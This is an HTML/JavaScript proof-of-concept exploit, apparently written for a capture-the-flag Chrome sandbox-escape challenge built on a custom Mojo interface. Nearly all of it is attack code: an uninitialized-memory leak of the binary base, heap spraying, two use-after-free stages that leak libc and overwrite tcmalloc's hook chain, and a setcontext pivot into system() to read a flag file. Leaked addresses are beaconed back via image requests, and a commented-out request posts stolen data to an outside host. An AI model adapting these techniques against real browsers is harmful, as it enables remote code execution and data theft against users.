<script src="/mojo_bindings.js"></script>
<script src="/being_creator_interface.mojom.js"></script>
<script>
    sleep = seconds => new Promise(resolve => setTimeout(resolve, seconds))

    // Server
    setcontext = 0x474d0n
    puts_offset = 0x71910n
    system = 0x449c0n

    setcontext = 0x52070n
    puts_offset = 0x809c0n
    system = 0x4f440n
    async function poc() {
        mojo;
        x = new blink.mojom.BeingCreatorInterfacePtr()
        Mojo.bindInterface(blink.mojom.BeingCreatorInterface.name,
            mojo.makeRequest(x).handle, "context")

        function FoodInterfaceImpl() {
            this.binding = new mojo.Binding(blink.mojom.FoodInterface, this)
        }

        FoodInterfaceImpl.prototype = {
            getWeight: async () => {
                try {
                    target.ptr.reset()
                    before_target.map(person => person.cat.ptr.reset())
                    modified = (await x.createCat()).cat
                    await Promise.all(spray.slice(0, 12).map(heap => heap.cat.setName(Array(0x40).join('.'))))
                    for (var i of [11]) {
                        // 11 from cf) below
                        await spray[i].cat.setName('.'.padStart(0x40))
                    }
                    modified = (await x.createPerson()).person

                    // Populate std::string before modifying is_ptr field
                    dv = new BigUint64Array(2)
                    dv[0] = BigInt(0x95285e8 + base)
                    dv[1] = BigInt(0x1000)
                    await modified.setName(dv.buffer)
                    done = 1

                    return {
                        // modify string::is_ptr
                        weight: 0x8000000000010000
                    };
                } catch (e) {
                    new Image().src = '/' + e
                }
            }
        }

        function bin2string(array) {
            var result = "";
            for (var i = 0; i < array.length; ++i) {
                result += (String.fromCharCode(array[i]));
            }
            return result;
        }

        try {
            // weight field is unintialized
            // we can leak /chrome binary base
            ages = []
            for (var i = 0; i < 16; i++) {
                // First, alloc and free a being
                _ = (await x.createCat()).cat
                _.ptr.reset()

                // Allocate n times for getting useful values from heap
                cat1 = (await x.createPerson()).person
                cat1 = (await x.createPerson()).person
                age = (await cat1.getWeight()).weight

                ages.push(age)
                if ((age & 0xfff) === 0x720) {
                    base = age - 0x2b16720
                    break
                }
            }
            // Just for logging
            ages.map((age, i) => new Image().src = '/age:' + i + ":" + age.toString(16))

            target = (await x.createCat()).cat
            // Free before freeing target
            before_target = await Promise.all([...Array(2).keys()].map(_ => x.createCat()))
            // Allocate after freeing target
            spray = await Promise.all([...Array(24).keys()].map(_ => x.createCat()))

            food = new FoodInterfaceImpl()
            food_ptr = new blink.mojom.FoodInterfacePtr()
            food.binding.bind(mojo.makeRequest(food_ptr))
            await Promise.all(spray.map(heap => heap.cat.setName('')))

            // First UAF to get .got.plt through getName
            target.cookAndEat(food_ptr)

            interval = setInterval(async () => {
                // Stage 2
                if (!window.done)
                    return
                else
                    clearInterval(interval)
                try {
                    await sleep(2000)
                    res = await modified.getName()
                    resname = res.name
                    // xhr = new XMLHttpRequest()
                    // xhr.open('POST', 'http://0e1.kr:10000', false)
                    // xhr.send(resname.buffer)
                    dv = new DataView(resname.buffer)
                    puts = dv.getBigUint64(0x38, true)
                    libc = puts - puts_offset
                    new Image().src = '/libc:' + libc.toString(16)

                    FoodInterfaceImpl.prototype = {
                        getWeight: async () => {
                            try {
                                target_.ptr.reset()
                                before_target_.map(person => person.cat.ptr.reset())
                                modified_ = (await x.createCat()).cat
                                await Promise.all(spray.slice(0, spray.length).map(heap => heap.cat.setName(Array(0x40).join('.'))))
                                for (var i of [11]) {
                                    await spray[i].cat.setName('.'.padStart(0x40))
                                }
                                modified_ = (await x.createPerson()).person

                                dv = new BigUint64Array(2)
                                dv[0] = BigInt(base + 0x953b558)
                                dv[1] = BigInt(0x1000)
                                await modified_.setName(dv.buffer)
                                done = 2

                                return {
                                    weight: 0x8000000000010000
                                };
                            } catch (e) {
                                new Image().src = '/' + e
                            }
                        }
                    }

                    target_ = (await x.createCat()).cat
                    before_target_ = await Promise.all([...Array(2).keys()].map(_ => x.createCat()))
                    spray = await Promise.all([...Array(24).keys()].map(_ => x.createCat()))

                    food = new FoodInterfaceImpl()
                    food_ptr = new blink.mojom.FoodInterfacePtr()
                    food.binding.bind(mojo.makeRequest(food_ptr))
                    await Promise.all(spray.map(heap => heap.cat.setName('')))

                    // Second UAF to set g_chain_head to the payload below
                    target_.cookAndEat(food_ptr)

                } catch (e) {
                    new Image().src = '/' + e
                }
            }, 100)

            interval2 = setInterval(async () => {
                try {
                    if (window.done !== 2)
                        return
                    else
                        clearInterval(interval2)

                    // tcmalloc hooks via g_chain_head: see malloc()
                    data = new BigUint64Array(0x100 / 8)

                    // points data[1]
                    data[0] = BigInt(base + 0x953b558 + 8)

                    // originally points TCMalloc()
                    data[1] = BigInt(libc + setcontext)

                    // cat /home/user/flag
                    data[5] = BigInt(0x6d6f682f20746163n)
                    data[6] = BigInt(0x662f726573752f65n)
                    data[7] = BigInt(0x67616cn)

                    // rsp
                    data[0xa8 / 8] = BigInt(base + 0x953b558 + 0x1000)
                    // rip
                    data[0xb0 / 8] = BigInt(libc + system)
                    // fldenv
                    data[0xe8 / 8] = BigInt(base + 0x953b558 + 0x1000)
                    // rdi: cmd
                    data[0x70 / 8] = BigInt(base + 0x953b558 + 0x28)

                    await modified_.setName(data.buffer)

                    // cf) Determining which item of spray is modified
                    // data=(await modified_.getName()).name
                    // new Image().src='/'+data.length+':'+spray.length
                    // for(var i = 0; i < spray.length; i++) {
                    // 	new Image().src='/age:'+i+':'+String.fromCharCode.apply(null, (await spray[i].cat.getName()).name)
                    // }
                } catch (e) {
                    new Image().src = '/' + e
                }
            }, 100)
        } catch (e) {
            new Image().src = '/' + e
        }
    };
    poc()
</script>